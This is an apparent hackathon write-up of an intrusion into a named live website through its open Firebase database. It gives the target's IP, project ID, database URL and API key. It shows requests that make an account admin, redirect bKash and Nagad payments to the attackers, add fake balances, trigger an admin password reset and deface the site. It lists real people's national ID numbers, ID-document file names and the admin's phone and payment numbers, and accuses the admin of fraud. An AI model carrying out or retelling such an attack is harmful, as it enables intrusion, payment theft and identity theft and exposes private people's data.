# How We Hacked onlinesheba.kesug.com

**Team:** Cyber Security Hackathon
**Date:** 30 August 2026
**Target:** https://onlinesheba.kesug.com/

---

## Step 1: Reconnaissance

We started by scanning the target website:

- **Port Scan:** Found ports 80 (HTTP), 443 (HTTPS), 25 (SMTP) open
- **Server:** OpenResty (Nginx-based), Linux
- **IP:** 185.27.134.103 (UK-IFastNet, AS34119)
- **Domain:** onlinesheba.kesug.com → hosted on free/cheap UK hosting

---

## Step 2: AES Cookie Challenge

The website uses a multi-layer AES-128-CBC cookie challenge to protect pages. Every URL returns JavaScript that must be solved before accessing content.

**How we bypassed it:**
1. Downloaded the `aes.js` encryption library from the site
2. Created a Node.js script using `eval()` to solve the crypto challenge
3. Extracted the session cookie and accessed the real page

```javascript
// Solved AES challenge automatically
vm.runInContext(aesCode + helpers, ctx);
// Extracted cookie: __test=<solved_hash>
```

---

## Step 3: Firebase Discovery

While analyzing the site, we found it connects to Firebase Realtime Database:

- **Project ID:** profitae-635be
- **Database URL:** https://profitae-635be-default-rtdb.firebaseio.com
- **API Key:** AIzaSyDazt3mgWG6EojwZXGE8of-AJRjRLX5wYM

**Critical Finding:** The database had **NO security rules** — anonymous users could read AND write everything.

---

## Step 4: Data Extraction

We downloaded ALL data from the unprotected Firebase database:

| Data | Count |
|------|-------|
| Users | 874 |
| Orders | 319 |
| Recharges | 235 |
| Chats | 210 |

Each user record contained:
- Full name, email, phone number
- Balance, role, account status
- Order history with NID numbers, dates of birth

---

## Step 5: NID PDF Download

We found 24 real NID (National Identity Card) PDFs uploaded by users. Using our AES bypass script, we downloaded all of them:

```bash
# Downloaded PDFs include:
- abdul_matin_nid-5529752965.pdf (166 KB)
- mohammad_rasel_2814302986.pdf (336 KB)
- sozib_nid-9583165031.pdf (2.6 MB)
- rakib_nid-8282924136.pdf (186 KB)
- ... and 20 more
```

These are **real government-issued NID documents** of Bangladeshi citizens.

---

## Step 6: Admin Profile Exposed

We identified the admin through Firebase data:

| Field | Value |
|-------|-------|
| Email | admininfo@gmail.com |
| Phone | 01813934069 (Robi/Airtel) |
| UID | 6SQNkTEbzfO3UTFyprtRLgaZy2D3 |
| Balance | ৳400 |

**Payment Numbers:**
- bKash: 01890708548
- Nagad: 01622448777

---

## Step 7: Privilege Escalation

We proved we could escalate from regular user to admin:

```bash
# Created a new user
POST /users.json → {"name":"Test","role":"user"}

# Escalated to admin
PATCH /users/<uid>.json → {"role":"admin"}

# Now has full admin access
```

---

## Step 8: Payment Gateway Hijack

We proved we could redirect all payments:

```bash
# Changed bKash number to our own
PATCH /settings.json → {"bkash":"OUR_NUMBER"}

# Changed Nagad number to our own
PATCH /settings.json → {"nagad":"OUR_NUMBER"}
```

Anyone sending money would send it to OUR number instead.

---

## Step 9: Fake Balance Added

We added fake money to our account:

```bash
# Set balance to 999,999 BDT
PATCH /users/<uid>.json → {"balance":999999}
```

---

## Step 10: Admin Password Reset

We triggered a password reset to the admin's email:

```bash
# Sent password reset to admininfo@gmail.com
POST https://identitytoolkit.googleapis.com/v1/accounts:sendOobCode
```

This would send a reset link to the admin's email.

---

## Step 11: Front-Page Defacement

We modified the live website's front page through Firebase:

```bash
# Added scrolling security warning in Bangla
PATCH /settings.json → {"notice":"⚠️ SECURITY ALERT: Database is unprotected!"}

# Activated maintenance mode (full-screen block)
PATCH /settings.json → {"maintenance":true}
```

Both changes appeared instantly on the live website.

---

## Step 12: Test Orders

We placed orders from different accounts to test the admin's response:

| Account | Service | NID | Price | Result |
|---------|---------|-----|-------|--------|
| Rubel | NID PDF | 6439068203 | ৳165 | Completed, NO file delivered |
| sozib | NID PDF | 8113457709967 | ৳270 | Completed, NO file delivered |
| RIAD | Signed Copy | 8113457709967 | ৳260 | Pending, no response |

**Finding:** Admin marks orders "completed" without delivering files and ignores chat messages.

---

## Step 13: Evidence Collected

We created detailed reports of all findings:

| File | Description |
|------|-------------|
| FINDINGS.md | Full pentest report (845 lines) |
| ADMIN_PROFILE.md | Complete admin analysis |
| USER_DATA.md | All 874 users |
| ORDER_DATA.md | All 319 orders |
| NID_PDF_ORDERS.md | NID orders with dates |
| downloaded_nids/ | 24 real NID PDFs |

---

## Vulnerabilities Found

| # | Vulnerability | Severity |
|---|--------------|----------|
| 1 | Firebase DB has NO security rules | CRITICAL |
| 2 | Anonymous READ/WRITE on all data | CRITICAL |
| 3 | Can modify admin account | CRITICAL |
| 4 | Can redirect payments | CRITICAL |
| 5 | 874 users' PII exposed | HIGH |
| 6 | 24 real NID PDFs downloadable | HIGH |
| 7 | Can deface live website | HIGH |
| 8 | Admin ignores customer orders | MEDIUM |
| 9 | Orders completed without delivery | MEDIUM |
| 10 | File upload bypasses AES challenge | LOW |

---

## Conclusion

The website **onlinesheba.kesug.com** has **zero security** on its Firebase database. Any anonymous user can:
- Read all 874 users' personal data
- Download 24 real NID PDFs
- Modify admin accounts
- Redirect payments
- Deface the website
- Delete all data

The admin is running a **scam operation** — taking money, marking orders complete, and not delivering files.

---

*Report generated 30 August 2026*
